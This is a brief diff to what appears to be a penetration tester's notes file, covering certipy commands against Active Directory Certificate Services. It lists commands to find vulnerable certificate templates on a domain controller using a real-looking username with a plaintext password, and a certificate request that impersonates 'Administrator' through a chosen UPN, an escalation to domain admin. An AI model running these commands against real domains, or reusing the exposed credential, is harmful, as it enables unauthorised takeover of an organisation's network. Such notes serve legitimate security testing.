@@ -1304,8 +1304,8 @@ Cryptographic Provider v1.0" -export -out admin.pfx
 
 ##certipy
 docker build -t certipy:latest .
-docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug
-
+docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug -stdout
+# ntpdate dc-ip
 certipy req -username 'user@example.com' -password Password -ca CA_Name -dc-ip DCIP -template TempName -upn
 'Administrator@example.com' -debug
 
